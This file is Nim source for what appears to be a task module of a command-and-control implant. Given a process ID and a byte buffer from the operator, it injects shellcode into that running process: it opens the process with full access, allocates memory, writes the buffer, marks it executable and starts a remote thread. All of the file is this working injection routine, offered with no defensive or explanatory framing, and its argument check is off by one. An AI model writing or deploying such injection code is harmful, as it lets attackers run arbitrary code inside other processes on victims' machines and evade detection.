import ../client/[communication, types]
import winim

import std/[bitops, strutils]
import system

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId

  if params.len < 1:
    taskOutput.error = "missing argument"
    app.sendOutput(taskOutput)
    return 

  let buf: seq[byte] = cast[seq[byte]](params[1])

  let pHandle: HANDLE = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](params[0].parseInt)
  )

  if cast[uint](pHandle) == 0:
    taskOutput.error = "couldn't open process"
    app.sendOutput(taskOutput)
    return

  let shellcode_ptr: LPVOID = VirtualAllocEx(
    pHandle,
    NULL, 
    cast[SIZE_T](buf.len), 
    bitor(MEM_COMMIT, MEM_RESERVE), 
    PAGE_READWRITE
  )

  if cast[uint](shellcode_ptr) == 0:
    taskOutput.error = "couldn't allocate memory"
    app.sendOutput(taskOutput)
    return

  var tid: DWORD 
  var bytesWritten: SIZE_T
  var oldProtect: DWORD

  WriteProcessMemory(pHandle, shellcode_ptr, unsafeAddr buf[0], cast[SIZE_T](buf.len), addr bytesWritten)
  VirtualProtectEx(pHandle, shellcode_ptr, bytesWritten, PAGE_EXECUTE_READ, addr oldProtect)

  let hThread: HANDLE = CreateRemoteThread(
    pHandle, NULL, 0, cast[PTHREAD_START_ROUTINE](shellcode_ptr), NULL, 0, unsafeAddr tid
  )
  
  if cast[uint](hThread) == 0:
    taskOutput.error = "couldn't create thread"

  CloseHandle(pHandle)
  app.sendOutput(taskOutput)